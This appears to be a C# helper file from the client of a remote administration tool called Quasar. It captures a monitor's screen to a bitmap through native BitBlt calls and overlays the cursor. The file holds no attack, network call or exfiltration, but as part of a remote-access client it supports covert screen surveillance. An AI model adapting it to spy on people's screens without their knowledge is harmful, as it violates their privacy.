﻿using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Quasar.Client.Utilities;

namespace Quasar.Client.Helper
{
    public static class ScreenHelper
    {
        private const int SRCCOPY = 0x00CC0020;

        public static Bitmap CaptureScreen(int screenNumber)
        {
            Rectangle bounds = GetBounds(screenNumber);
            Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);

            using (Graphics g = Graphics.FromImage(screen))
            {
                IntPtr destDeviceContext = g.GetHdc();
                IntPtr srcDeviceContext = NativeMethods.CreateDC("DISPLAY", null, null, IntPtr.Zero);

                NativeMethods.BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height, srcDeviceContext, bounds.X,
                    bounds.Y, SRCCOPY);

                NativeMethods.DeleteDC(srcDeviceContext);
                g.ReleaseHdc(destDeviceContext);
                
                Cursor currentCursor = Cursors.Default;
                Rectangle cursorBounds = new Rectangle(Cursor.Position, currentCursor.Size);
                currentCursor.Draw(g, cursorBounds);
            }

            return screen;
        }

        public static Rectangle GetBounds(int screenNumber)
        {
            return Screen.AllScreens[screenNumber].Bounds;
        }
    }
}
